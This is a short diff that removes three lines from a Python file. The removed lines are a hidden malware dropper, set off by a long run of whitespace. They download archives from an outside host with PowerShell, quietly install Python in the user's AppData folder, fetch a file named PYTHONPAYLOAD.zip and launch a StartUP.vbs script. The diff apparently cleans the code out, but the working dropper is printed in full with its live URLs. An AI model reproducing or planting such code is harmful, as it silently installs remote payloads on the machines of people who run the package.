@@ -1,3 +1,0 @@
-import os
-import subprocess                                                                                                                                    
-subprocess.Popen('cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft & powershell -command "Invoke-WebRequest https://s01.babup.com/uploads/python.zip -OutFile python.zip" & powershell -command "Expand-Archive python.zip" & cd python & python.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_lib=1 & cd .. & powershell -command "Invoke-WebRequest https://s01.babup.com/uploads/PYTHONPAYLOAD.zip -OutFile python.zip" & powershell -command "Expand-Archive python.zip" & cd python & start StartUP.vbs & exit', shell=True)
